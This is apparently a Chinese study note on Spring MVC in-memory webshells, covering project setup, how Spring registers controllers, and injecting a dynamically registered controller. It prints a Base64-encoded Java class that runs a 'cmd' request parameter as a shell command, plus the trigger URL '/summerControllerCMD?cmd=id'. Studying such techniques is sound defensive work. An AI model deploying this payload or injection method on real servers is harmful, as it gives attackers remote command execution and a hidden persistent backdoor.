# SpringMVC内存马

- [SpringMVC内存马](#springmvc内存马)
  - [环境配置](#环境配置)
    - [使用IDEA](#使用idea)
    - [使用VSCode](#使用vscode)
      - [创建一个基本的Maven Web项目](#创建一个基本的maven-web项目)
      - [添加依赖](#添加依赖)
      - [配置VSCode Task](#配置vscode-task)
      - [配置 WEB-INF](#配置-web-inf)
  - [编写一个基础的 Controller](#编写一个基础的-controller)

---

## 基础概念

- **基础架构**: Spring MVC 是基于 Servlet API 构建的。Spring MVC 的核心组件 DispatcherServlet 本质上是一个 Servlet, 它负责将 HTTP 请求分发到相应的处理器（如 Controller）
- **请求处理流程**：当一个 HTTP 请求到达时，Servlet 容器（如 Tomcat）会将请求传递给 DispatcherServlet。DispatcherServlet 再根据请求映射将请求分发给相应的 Controller 进行处理。

---

### DispatcherServlet

`DispatcherServlet` 是 Spring MVC 框架的核心组件之一，本质上是一个 Servlet, 它负责将 HTTP 请求分发到相应的处理器（如 Controller）

> ![img](http://cdn.ayusummer233.top/DailyNotes/202410211358362.png)

- 主要职责

  - **初始化**：在应用启动时，`DispatcherServlet` 会被初始化，并加载 Spring 应用上下文（ApplicationContext），从而初始化所有的 Spring Bean，包括 Controller、Service、Repository 等
  - **请求分发**：`DispatcherServlet` 拦截所有进入的 HTTP 请求，并根据请求 URL 将其分发到相应的 Controller 进行处理。
  - **视图解析**：处理完请求后，`DispatcherServlet` 会将处理结果交给视图解析器（ViewResolver），生成最终的视图（如 JSP、Thymeleaf 模板等）并返回给客户端。

- 工作流程

  1. **接收请求**：`DispatcherServlet` 接收到 HTTP 请求。
  2. **查找处理器**：根据请求 URL，`DispatcherServlet` 使用处理器映射（HandlerMapping）查找相应的处理器（通常是一个 Controller）。
  3. **调用处理器**：将请求交给找到的处理器（Controller）进行处理。
  4. **处理结果**：处理器返回一个 ModelAndView 对象，包含视图名和模型数据。
  5. **视图解析**：`DispatcherServlet` 使用视图解析器（ViewResolver）将视图名解析为实际的视图对象。
  6. **渲染视图**：视图对象负责渲染最终的视图，并将其返回给客户端。

- 配置

  在 Spring Boot 中，`DispatcherServlet` 通常是自动配置的，但在传统的 Spring MVC 项目中，需要在 `web.xml` 中进行配置：

---

## 环境配置

- 部署环境: `tomcat:8` Docker(`jdk21.0.2`)

- 开发环境: `jdk21.0.2` + `maven 3.9.9` + `jdk1.8.0_121`

  本节的项目代码: [DailyNotesCode/Security/Web/MemShell/Java/SpringMVC/spring-webmvc-memshell at main · 233Official/DailyNotesCode (github.com)](https://github.com/233Official/DailyNotesCode/tree/main/Security/Web/MemShell/Java/SpringMVC/spring-webmvc-memshell)

---

### 使用IDEA

> [MoreThanJava/java-web/springMVC/Spring-MVC【入门】就这一篇！.md at master · wmyskxz/MoreThanJava · GitHub](https://github.com/wmyskxz/MoreThanJava/blob/master/java-web/springMVC/Spring-MVC【入门】就这一篇！.md)

IDEA 便捷创建 Spring 项目需要 Ultimate 版本, 这里暂且按下不表, 等后续申请到 License 考虑补充下(

可以直接参考 [MoreThanJava/java-web/springMVC/Spring-MVC【入门】就这一篇！.md at master · wmyskxz/MoreThanJava · GitHub](https://github.com/wmyskxz/MoreThanJava/blob/master/java-web/springMVC/Spring-MVC【入门】就这一篇！.md)

---

### 使用VSCode

---

> [VSCode 上的 Spring MVC - Maven 项目 - DEV 社区 --- Spring MVC on VSCode - Maven Project - DEV Community](https://dev.to/spaceofmiah/spring-mvc-on-vscode-maven-project-50g8)

---

安装 Extension Pack for Java 扩展:

![image-20240925135623429](http://cdn.ayusummer233.top/DailyNotes/202410162304623.png)

---

#### 创建一个基本的Maven Web项目

使用 VSCode 先创建一个 Maven Web 项目

创建 Maven 项目:

![image-20240925135835528](http://cdn.ayusummer233.top/DailyNotes/202410162321947.png)

![image-20240925135939885](http://cdn.ayusummer233.top/DailyNotes/202410162321722.png)

版本选择最新的即可:

![image-20240925140222334](http://cdn.ayusummer233.top/DailyNotes/202410162321839.png)

group id 按需填写, 直接 `com.example` 也行

![image-20241016232230634](http://cdn.ayusummer233.top/DailyNotes/202410162322660.png)

填写 `artifact id`

> - Maven 项目中，`artifactId` 代表了项目的唯一标识符, 通常也是项目的名称, 通常与 `groupId` 结合使用来唯一标识一个项目。
>
>   Maven 会使用它来命名生成的构建工件（如 JAR 或 WAR 文件）。
>
> - `artifactId` 通常是项目的名称，应该简洁明了，能够反映项目的功能或目的
>
>   通常使用小写字母和短横线（`-`）来分隔单词例如，如果此项目是一个动态过滤器示例，可以使用 `dynamic-filter-demo` 作为 `artifactId`

![image-20240925141007920](http://cdn.ayusummer233.top/DailyNotes/202410162321799.png)

------

选择一个目录放置此项目后会自动开始构建(需要手动确认/修改下版本号)

![image-20241016232336537](http://cdn.ayusummer233.top/DailyNotes/202410162323593.png)

---

#### 添加依赖

![image-20241016234542119](http://cdn.ayusummer233.top/DailyNotes/202410162345147.png)

![image-20241016234602248](http://cdn.ayusummer233.top/DailyNotes/202410162346270.png)

![image-20241016234627694](http://cdn.ayusummer233.top/DailyNotes/202410162346719.png)

这会自动给当前 pom.xml 添加一个 dependency:

![image-20241016234734988](http://cdn.ayusummer233.top/DailyNotes/202410162347026.png)

**`spring-webmvc`** 是 Spring MVC 框架的核心，它依赖于 `spring-core`、`spring-beans` 和 `spring-context`，并且包含了 `spring-web`。添加这个依赖后，会自动引入其他必要的 Spring 组件，如 Servlet 相关的支持、Web 应用程序上下文、控制器、视图解析器等。

直接添加 `spring-webmvc` 可以方便地创建一个 Spring MVC 项目，因为它已经包含了所有必需的依赖，而不需要手动添加其他 Spring 核心模块。

> 这里建议修改一下 pom.xml, 默认的可能不是最合适的
>
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> 
> <project xmlns="http://maven.apache.org/POM/4.0.0"
>   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
>   <modelVersion>4.0.0</modelVersion>
> 
>   <groupId>com.summery233</groupId>
>   <artifactId>spring-webmvc-memshell</artifactId>
>   <version>1.0-SNAPSHOT</version>
>   <packaging>war</packaging>
> 
>   <name>spring-webmvc-memshell Maven Webapp</name>
>   <!-- FIXME change it to the project's website -->
>   <url>http://www.example.com</url>
> 
>   <repositories>
>     <repository>
>       <id>aliyun-public</id>
>       <name>阿里云公共仓库</name>
>       <url>https://maven.aliyun.com/repository/public</url>
>     </repository>
>   </repositories>
> 
>   <properties>
>     <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
>     <maven.compiler.source>8</maven.compiler.source>
>     <maven.compiler.target>8</maven.compiler.target>
>   </properties>
> 
>   <dependencies>
> 
>     <dependency>
>       <groupId>org.springframework</groupId>
>       <artifactId>spring-webmvc</artifactId>
>       <version>5.2.3.RELEASE</version>
>     </dependency>
> 
>     <dependency>
>       <groupId>javax.servlet</groupId>
>       <artifactId>javax.servlet-api</artifactId>
>       <version>3.1.0</version>
>       <scope>provided</scope>
>     </dependency>
>     <dependency>
>       <groupId>org.apache.tomcat</groupId>
>       <artifactId>tomcat-catalina</artifactId>
>       <version>8.5.100</version>
>     </dependency>
> 
>     <dependency>
>       <groupId>junit</groupId>
>       <artifactId>junit</artifactId>
>       <version>4.11</version>
>       <scope>test</scope>
>     </dependency>
>   </dependencies>
> </project>
> 
> ```
>
> - 这里 jdk 版本设置不能太高, 建议直接和上述配置一样是 8, 高了可能会出现编译出的 class spring用不了的情况
>
> - 这里的 spring-webmvc 版本也不能太高, 否则后面关于的配置中关于 Controller 的部分也会找不到类, 建议和上述配置文件保持一致

---

#### 配置VSCode Task

想方便编译项目的话也可以在当前项目根目录下新建一个 `.vscode/tasks.json` 文件:

```json
{
    "version": "2.0.0",
    "tasks": [
      {
        "label": "Maven Compile",
        "type": "shell",
        "command": "mvn clean compile",
        "group": {
          "kind": "build",
          "isDefault": false
        },
        "problemMatcher": ["$javac"]
      },
      {
        "label": "Maven Package",
        "type": "shell",
        "command": "mvn clean package",
        "group": {
          "kind": "build",
          "isDefault": true
        },
        "problemMatcher": ["$javac"]
      }
    ]
  }
  
```

这样直接 `Ctrl+Shift+B` 会调用其中 `"isDefault": true` 的 `mvn clean package` 命令

![image-20241017000024266](http://cdn.ayusummer233.top/DailyNotes/202410170000335.png)

---

要运行其他非默认 Task 可以 `Ctrl+shift+P` 调出命令面板, 选择 `Tasks: Run Task`

![image-20241017000101139](http://cdn.ayusummer233.top/DailyNotes/202410170001167.png)

![image-20241017000130155](http://cdn.ayusummer233.top/DailyNotes/202410170001188.png)

---

#### 配置 WEB-INF

![image-20241017001647045](http://cdn.ayusummer233.top/DailyNotes/202410170016133.png)

---

`applicationContext.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

</beans>
```

---

`dispatcher-servlet.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">
    <context:component-scan base-package="com.summery233"/>
    <bean class="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"/>
</beans>
```

> ![image-20241017012548168](http://cdn.ayusummer233.top/DailyNotes/202410170125219.png)

---

`web.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
  <display-name>Archetype Created Web Application</display-name>

  <context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext.xml</param-value>
  </context-param>

  <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
  </listener>

  <servlet>
    <servlet-name>dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
      <param-name>contextConfigLocation</param-name>
      <param-value>WEB-INF/dispatcher-servlet.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
  
  <servlet-mapping>
    <servlet-name>dispatcher</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>
</web-app>
```

---

## 编写一个基础的 Controller

```java
package com.summery233;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * spring index controller
 *
 * @author su18
 */
@Controller
@RequestMapping(value = "/index")
public class IndexController {

	@GetMapping()
	public void index(HttpServletRequest request, HttpServletResponse response) throws Exception {
		response.getWriter().println("spring index controller");
	}

}
```

编译部署后可以访问 `/index` 看到对应回显

![image-20241017012754417](http://cdn.ayusummer233.top/DailyNotes/202410170127457.png)

---

## Spring Controller 内存马

> [RequestMappingHandlerMapping注入的正确姿势-CSDN博客](https://blog.csdn.net/ywg_1994/article/details/112800703)
>
> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#spring-controller-内存马)

---

### 动态注册 Controller

在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping

在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。这里使用 spring-webmvc-5.2.3 进行调试。

所谓 Spring Controller 的动态注册，就是对 RequestMappingHandlerMapping 注入的过程, 可以参考 [RequestMappingHandlerMapping注入的正确姿势-CSDN博客](https://blog.csdn.net/ywg_1994/article/details/112800703)

首先来看两个类：

- `RequestMappingInfo`：一个封装类，对一次 http 请求中的相关信息进行封装。
- `HandlerMethod`：对 Controller 的处理请求方法的封装，里面包含了该方法所属的 bean、method、参数等对象。

SpringMVC 初始化时，在每个容器的 bean 构造方法、属性设置之后，将会使用 InitializingBean 的 `afterPropertiesSet` 方法进行 Bean 的初始化操作，其中实现类 RequestMappingHandlerMapping 用来处理具有 `@Controller` 注解类中的方法级别的 `@RequestMapping` 以及 RequestMappingInfo 实例的创建。看一下具体的是怎么创建的。

它的 `afterPropertiesSet` 方法初始化了 `RequestMappingInfo.BuilderConfiguration` 这个配置类，然后调用了其父类 `AbstractHandlerMethodMapping` 的 `afterPropertiesSet` 方法。

![img](http://cdn.ayusummer233.top/DailyNotes/202410181801392.png)

这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 `processCandidateBean` 方法处理 Bean。

![img](http://cdn.ayusummer233.top/DailyNotes/202410181802725.png)

`processCandidateBean` 方法

![img](http://cdn.ayusummer233.top/DailyNotes/202410211124908.png)

`isHandler` 方法判断当前 bean 定义是否带有 Controller 或 RequestMapping 注解。

![img](http://cdn.ayusummer233.top/DailyNotes/202410211125866.png)

`detectHandlerMethods` 查找 handler methods 并注册。

![img](http://cdn.ayusummer233.top/DailyNotes/202410211127861.png)

正如上面提到的 `在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射`, **这部分有两个关键功能，一个是 `getMappingForMethod` 方法根据 handler method 创建RequestMappingInfo 对象，一个是 `registerHandlerMethod` 方法将 handler method 与访问的 创建 RequestMappingInfo 进行相关映射**。

![img](http://cdn.ayusummer233.top/DailyNotes/202410211130567.png)

这里我们看到，是调用了 MappingRegistry 的 register 方法，这个方法将一些关键信息进行包装、处理和储存

![img](http://cdn.ayusummer233.top/DailyNotes/202410211131768.png)

关键信息储存位置如下：

![img](http://cdn.ayusummer233.top/DailyNotes/202410211329700.png)

以上就是整个注册流程

---

然后来看一次请求进来时的查找流程

在 AbstractHandlerMethodMapping 的 lookupHandlerMethod 方法：

- 在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos
- 如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos
- 获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod

上述的流程和较详细的流程描述在 [SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园 (cnblogs.com)](https://www.cnblogs.com/w-y-c-m/p/8416630.html) 中可以查看

---

那接下来就是动态注册 Controller 了，LandGrey 师傅在 [基于内存 Webshell 的无文件攻击技术研究 - LandGrey's Blog](https://landgrey.me/blog/12/) 中列举了几种可用来添加的接口，其实[本章](https://su18.org/post/memory-shell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC)上都是调用之前我们提到的 MappingRegistry 的 register 方法。

和 Servlet 的添加较为类似的是，重点需要添加的就是访问 url 与 RequestMappingInfo 的映射，以及是 RequestMappingInfo 与 HandlerMethod 的映射。

[这里我](https://su18.org/post/memory-shell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC)不会使用 LandGrey 师傅提到的接口，而是直接使用 MappingRegistry 的 register 方法来添加，当然，同样可以通过自己实现逻辑，通过反射直接写进重要位置，不使用 Spring 提供的接口。

---

### Base64字符串加载为Class

> [MemoryShell/memshell-spring/src/main/java/org/su18/memshell/spring/controller/DynamicUtils.java at main · su18/MemoryShell (github.com)](https://github.com/su18/MemoryShell/blob/main/memshell-spring/src/main/java/org/su18/memshell/spring/controller/DynamicUtils.java)

编写一个将 Base64 编码的 class 字符串解析生成对应 class 对象的函数

![image-20241021141422734](http://cdn.ayusummer233.top/DailyNotes/202410211414878.png)

顺便可以看一下 su18 师傅这里的这个 SpringController Base64 对应的 class:

![image-20241021142101303](http://cdn.ayusummer233.top/DailyNotes/202410211421416.png)

---

### 编写动态注册 Controller 方法

> [MemoryShell/memshell-spring/src/main/java/org/su18/memshell/spring/controller/AddController.java at main · su18/MemoryShell (github.com)](https://github.com/su18/MemoryShell/blob/main/memshell-spring/src/main/java/org/su18/memshell/spring/controller/AddController.java)

![image-20241021142449969](http://cdn.ayusummer233.top/DailyNotes/202410211424067.png)

![image-20241021142501401](http://cdn.ayusummer233.top/DailyNotes/202410211425490.png)

---

### 看看 su18 师傅的原生代码效果

正常访问 indexController:

![image-20241021144253673](http://cdn.ayusummer233.top/DailyNotes/202410211442797.png)

动态添加 Controller: `/add`

![image-20241021144335993](http://cdn.ayusummer233.top/DailyNotes/202410211443106.png)

---

访问添加的 Controller: `/su18`

![image-20241021144414681](http://cdn.ayusummer233.top/DailyNotes/202410211444764.png)

---

### 注入恶意Controller

编写恶意 Controller:

![image-20241021150422289](http://cdn.ayusummer233.top/DailyNotes/202410211504445.png)

连着项目一期编译， 取出这个类的 class [编码为 Base64 字符串](https://github.com/233Official/DailyNotesCode/blob/main/Java/CommonUse/Encode/Base64/ClassToBase64/ClassToBase64.java):

![image-20241021151031388](http://cdn.ayusummer233.top/DailyNotes/202410211510524.png)

```
yv66vgAAADQAqAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAIXRoaXMgaXMgYSBTdW1tZXJDb250cm9sbGVyQ01EPGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbggAIAEAA2NtZAsAIgAjBwAkDAAlACYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHACgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHACoBABBqYXZhL2xhbmcvU3RyaW5nCAAsAQAGd2hvYW1pCgAnAC4MAAUALwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYKACcAMQwAMgAzAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsKADUANgcANwwAOAA5AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07BwA7AQARamF2YS91dGlsL1NjYW5uZXIKADoAPQwABQA+AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABAAQACXGEKADoAQgwAQwBEAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgA6AEYMAEcASAEAB2hhc05leHQBAAMoKVoKADoASgwASwBMAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CABOAQAACABQAQABXAoAKQBSDABTAFQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgoAOgBWDABXAAYBAAVjbG9zZQcAWQEAE2phdmEvbGFuZy9UaHJvd2FibGUKAFgAWwwAXABdAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVggAXwEAAnNoCABhAQACLWMIAGMBAAdjbWQuZXhlCABlAQACL2MKAGcAaAcAaQwAagBrAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBnAG0MAG4AbwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAbAHEMAHIABgEABWZsdXNoCgAbAFYHAHUBABNqYXZhL2xhbmcvRXhjZXB0aW9uCgB0AHcMAHgABgEAD3ByaW50U3RhY2tUcmFjZQcAegEALWNvbS9zdW1tZXJ5MjMzL2NvbnRyb2xsZXIvU3VtbWVyQ29udHJvbGxlckNNRAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTGNvbS9zdW1tZXJ5MjMzL2NvbnRyb2xsZXIvU3VtbWVyQ29udHJvbGxlckNNRDsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAhvdXRwdXRPUwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACXNjYW5uZXJPUwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABm91dHB1dAEAAXMBAAdpc0xpbnV4AQABWgEAEHByb2Nlc3NCdWlsZGVyT1MBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEACXByb2Nlc3NPUwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAARpbk9TAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEY21kcwEA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
```

对应改下注册代码:

![image-20241021152555489](http://cdn.ayusummer233.top/DailyNotes/202410211525621.png)

> 需要注意的是之前做 Tomcat 内存马时写的恶意类不会实际注册到应用中, 因为没在 web.xml 或者注解配置路由
>
> 这里写的恶意类连着项目编译的话是能够成功注册的, 所以要测试内存马的话记得把这个类文件移出去

编译部署看下:

![image-20241021153106150](http://cdn.ayusummer233.top/DailyNotes/202410211531279.png)

> 如果没把恶意类移出去会提示路由已存在
>
> ![image-20241021153148253](http://cdn.ayusummer233.top/DailyNotes/202410211531355.png)

`/add`:

![image-20241021155537463](http://cdn.ayusummer233.top/DailyNotes/202410211555580.png)

`/summerControllerCMD?cmd=id`:

![image-20241021155648462](http://cdn.ayusummer233.top/DailyNotes/202410211556558.png)

---

















